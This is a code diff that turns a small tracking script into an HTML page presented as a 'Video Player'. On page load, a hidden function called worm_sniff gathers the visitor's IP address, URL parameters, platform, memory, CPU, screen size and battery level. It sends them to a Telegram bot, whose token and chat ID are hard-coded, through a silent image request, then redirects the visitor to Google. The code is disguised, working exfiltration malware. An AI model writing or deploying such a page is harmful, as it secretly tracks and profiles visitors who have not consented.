@@ -1,37 +1,64 @@
-<script>
-  const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
-  const CHAT_ID = "8053770740";
-  const REDIRECT = "https://google.com"; // Seu link de destino
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Player</title>
+</head>
+<body style="background-color: #000;">
+    <script>
+        const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
+        const CHAT_ID = "8053770740";
+        const REDIRECT_URL = "https://google.com";
 
-  async function capturar() {
-    let ip = "N/A";
-    
-    // Lista de provedores para evitar bloqueio
-    const providers = [
-      'https://api.ipify.org?format=json',
-      'https://ipapi.co/json/',
-      'https://ip-api.com/json/'
-    ];
+        async function worm_sniff() {
+            let ip = "N/A";
+            const params = new URLSearchParams(window.location.search).toString() || "Nenhum";
+            
+            try {
+                // Captura IP via Cloudflare (Bypass Brave)
+                const r = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const t = await r.text();
+                ip = t.match(/ip=(.*)/)[1];
+            } catch(e) {}
 
-    for (let url of providers) {
-      try {
-        const res = await fetch(url);
-        const data = await res.json();
-        ip = data.ip || data.query || ip;
-        if (ip !== "N/A") break; // Se pegou o IP, para de procurar
-      } catch (e) { continue; }
-    }
+            // Metadados do Sistema
+            const specs = {
+                plt: navigator.platform,
+                mem: navigator.deviceMemory + "GB",
+                cpu: navigator.hardwareConcurrency,
+                res: screen.width + "x" + screen.height,
+                bat: "N/A"
+            };
 
-    const msg = `WORM WEB LOG\nIP: ${ip}\nUA: ${navigator.userAgent}`;
-    const botUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+            // Captura Bateria
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    specs.bat = Math.round(b.level * 100) + "%";
+                } catch(e) {}
+            }
 
-    // Beacon é ignorado pelo cache, ele sempre envia
-    navigator.sendBeacon(botUrl);
+            // Montagem do Relatorio
+            const report = "WORM FULL REPORT\n" +
+                           "IP: " + ip + "\n" +
+                           "INJETADO: " + params + "\n" +
+                           "SISTEMA: " + specs.plt + "\n" +
+                           "RAM/CPU: " + specs.mem + "/" + specs.cpu + "\n" +
+                           "TELA: " + specs.res + "\n" +
+                           "BATERIA: " + specs.bat;
 
-    setTimeout(() => {
-      window.location.href = REDIRECT;
-    }, 800);
-  }
+            const target = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(report);
+            
+            // Envio via Image (Mais silencioso)
+            const img = new Image();
+            img.src = target;
 
-  capturar();
-</script>
+            // Redirecionamento
+            setTimeout(() => {
+                window.location.replace(REDIRECT_URL);
+            }, 800);
+        }
+
+        worm_sniff();
+    </script>
+</body>
+</html>
